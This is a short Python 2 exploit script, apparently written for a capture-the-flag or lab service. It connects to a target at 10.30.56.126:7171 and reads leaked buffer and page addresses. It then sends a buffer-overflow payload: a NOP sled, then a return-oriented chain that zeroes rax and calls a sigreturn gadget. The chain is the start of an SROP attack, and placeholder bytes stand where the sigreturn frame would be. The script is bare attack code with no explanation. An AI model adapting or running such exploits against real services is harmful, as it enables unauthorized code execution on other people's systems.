from socket import create_connection
import struct

XOR_RAX_RAX   = 0x00000000004323df # xor rax,rax ; ret
SYSCALL       = 0x000000000040168a # syscall
SYSCALL_RET   = 0x000000000040116f # syscall ; ret
SIGRETURN_IND = 0x0000000000401168 # mov rax, 15; syscall; ret

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection(("10.30.56.126", 7171))
buffer_address = recv_n_bytes(s, 8)
print repr(buffer_address)
buffer_address = struct.unpack("<Q", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 8)
print repr(page)
page = struct.unpack("<Q", page)[0]
print hex(page)

sploit  = "\x90" * 0x200
sploit += "B" * 8
sploit += struct.pack("<Q", XOR_RAX_RAX)
sploit += struct.pack("<Q", SIGRETURN_IND)
sploit += "Z" * 200
s.send(sploit)
